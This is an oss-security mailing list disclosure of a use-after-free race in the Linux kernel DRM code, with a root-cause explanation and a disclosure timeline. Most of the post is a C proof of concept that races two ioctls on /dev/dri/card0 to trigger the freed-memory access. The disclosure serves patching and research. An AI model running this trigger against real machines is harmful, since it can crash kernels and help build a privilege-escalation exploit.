@@ -1,0 +1,76 @@
+
+Date: Tue, 12 Apr 2022 19:42:04 +0800
+From: Minh Yuan <yuanmingbuaa@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Linux kernel: A concurrency use-after-free between drm_setmaster_ioctl and drm_mode_getresources
+
+Hi guys,
+
+We recently discovered a concurrency uaf in drm of the latest kernel
+version (Linux 4.19.237).
+
+The root cause of this race is that drm_setmaster_ioctl can free an old
+*fpriv->master* in drm_new_set_master, while drm_mode_getresources holds a
+freed *fpriv->master *in drm_lease_held due to the absence of proper
+lock/refcounting.
+
+My unstable PoC is shown below (tested on Linux 4.19.237):
+
+#include <endian.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <pthread.h>
+#include <sys/xattr.h>
+#include <sys/shm.h>
+#include <linux/userfaultfd.h>
+#include <sys/ioctl.h>
+#include <drm/drm.h>
+#include <drm/drm_mode.h>
+
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+} while (0)
+int fd;
+char a[0x100];
+void *thread1(void *arg)
+{
+
+ioctl(fd, DRM_IOCTL_SET_MASTER, 0);
+
+}
+void *thread2(void *arg)
+{
+ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &a);
+}
+int main(void)
+{
+pthread_t thr1,thr2;
+
+int fd1 = open("/dev/dri/card0",0);
+fd = open("/dev/dri/card0",0);
+int fd2 = dup3(fd,fd1,0);
+int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
+if(s != 0)
+errExit("pthread_create");
+s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
+if(s != 0)
+errExit("pthread_create");
+pthread_join(thr1,NULL);
+pthread_join(thr2,NULL);
+close(fd);
+}
+
+Timeline:
+* 03.30.22 - Vulnerability reported to security@...nel.org.
+* 04.01.22 - Vulnerability reported to linux-distros@...openwall.org
+<security@...nel.org>.
+* 04.12.22 - Vulnerability opened.
+
